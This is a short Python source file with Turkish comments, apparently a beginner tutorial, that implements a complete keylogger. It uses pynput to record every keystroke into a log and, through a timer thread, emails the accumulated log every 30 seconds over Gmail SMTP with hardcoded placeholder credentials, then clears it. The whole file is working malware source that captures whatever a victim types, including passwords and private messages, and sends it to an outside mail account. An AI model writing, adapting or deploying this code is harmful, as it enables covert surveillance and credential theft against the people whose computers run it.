import pynput.keyboard  # pu paketi pip ile indirmeliyiz (pynput)
import smtplib
import threading

log = ""


def callback_function(key):  # içine bir key değeri (basılan) alır
    global log
    try:
        # log = log + key.char.encode("utf-8")
        log = log + str(key.char)  # gelen key değerini aldık str formatına dönüştürdük
    except AttributeError:  # space vs.. gelirse attribute error alıyoruz Bu sebeple except aldık
        if key == key.space:  # eğer basılan değer key.space ise
            log = log + " "  # log'un son haline " " boşluk ekle
        else:
            log = log + str(key)

    print(log)


def send_email(user_name, user_password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)  # ilk parametre host adı ikinci parametre port numarası
    email_server.starttls()  # bağlantıyı açtık
    email_server.login(user_name, user_password)
    email_server.sendmail(user_name, user_name, message)  # hangi mailden hangi maile ve ne yazılacağı
    email_server.quit()  # serverdan çıktık


# thread - threading
def thread_function():
    global log
    send_email("deneme@gmail.com", "denemesifresi1", log)  # mail atsın logları
    log = ""  # her mail attıktan sonra log değişkeni sıfırlansın
    timer_object = threading.Timer(30,
                                   thread_function)  # 2 parametre alır, kaç saniyede bir hangi fonksiyonu çalıştırayım diyor
    timer_object.start()  # objeyi başlattık


keylogger_listener = pynput.keyboard.Listener(
    on_press=callback_function)  # classtan bir instance oluşturduk içeri bir fonksiyon alır

with keylogger_listener:  # listener'ı başlatıyoruz
    thread_function()  # yazdığımız threading'i çalıştırıyoruz
    keylogger_listener.join()  # listener'imize ekleme yapıyoruz
